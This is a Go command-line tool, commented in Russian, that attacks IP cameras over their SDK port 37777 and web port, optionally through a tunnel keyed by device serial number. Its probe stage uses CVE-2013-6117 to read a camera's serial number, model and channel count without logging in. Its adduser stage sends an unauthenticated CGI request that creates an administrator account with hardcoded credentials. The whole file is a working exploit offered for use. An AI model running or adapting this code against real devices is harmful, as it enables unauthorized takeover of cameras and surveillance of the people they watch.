package main

import (
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"time"

	"krushitel/core/fwd"
)

type dialer func(port int) (net.Conn, error)

func main() {
	serial := flag.String("serial", "", "серийник: туннель своим стеком fwd")
	host := flag.String("host", "127.0.0.1", "хост без туннеля")
	sdkPort := flag.Int("sdk", 37777, "SDK-порт камеры")
	httpPort := flag.Int("http", 80, "веб-порт камеры")
	user := flag.String("user", "sniffscan", "юзер для CGI addUser")
	pass := flag.String("pass", "sc4nner2026", "пароль для CGI addUser")
	stage := flag.String("stage", "probe", "probe | adduser | both")
	flag.Parse()

	var d dialer
	if *serial != "" {
		fmt.Printf("== туннель по серийнику %s (SDK %d, HTTP %d)...\n", *serial, *sdkPort, *httpPort)
		f, err := fwd.Start(*serial, []fwd.PortSpec{
			{Local: 0, Remote: *sdkPort},
			{Local: 0, Remote: *httpPort},
		}, 0, "", "")
		if err != nil {
			fmt.Println("[-] туннель не встал:", err)
			os.Exit(1)
		}
		defer f.Stop()
		d = func(port int) (net.Conn, error) { return f.DialCamera(port) }
		fmt.Println("[+] туннель ок")
	} else {
		h := *host
		d = func(port int) (net.Conn, error) {
			return net.DialTimeout("tcp", fmt.Sprintf("%s:%d", h, port), 10*time.Second)
		}
		fmt.Printf("== цель %s\n", h)
	}

	if *stage == "probe" || *stage == "both" {
		fmt.Println("\n== CVE-2013-6117: SDK 37777 unauth probe (getSerial, no login)")
		sn, model, channels, ok := probeNoAuthSDK(
			func() (net.Conn, error) { return d(*sdkPort) }, 4*time.Second)
		fmt.Printf("    ok=%v serial=%q model=%q channels=%d\n", ok, sn, model, channels)
	}

	if *stage == "adduser" || *stage == "both" {
		fmt.Println("\n== CGI addUser через туннель")
		path := fmt.Sprintf("/cgi-bin/userManager.cgi?action=addUser"+
			"&user.Name=%s&user.Password=%s&user.Group=admin"+
			"&user.Sharable=true&user.Reserved=false"+
			"&user.AuthList=Config|Info|Monitor_01|Playback_01", *user, *pass)
		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n", path)
		conn, err := d(*httpPort)
		if err != nil {
			fmt.Println("    dial:", err)
			return
		}
		defer conn.Close()
		conn.SetDeadline(time.Now().Add(8 * time.Second))
		if _, err := conn.Write([]byte(req)); err != nil {
			fmt.Println("    write:", err)
			return
		}
		out, _ := io.ReadAll(conn)
		head := string(out)
		if i := strings.Index(head, "\r\n\r\n"); i > 0 {
			fmt.Printf("    status: %s\n", strings.SplitN(head, "\r\n", 2)[0])
			fmt.Printf("    body: %q\n", strings.TrimSpace(head[i+4:]))
		} else {
			fmt.Printf("    raw: %q\n", head)
		}
	}
}
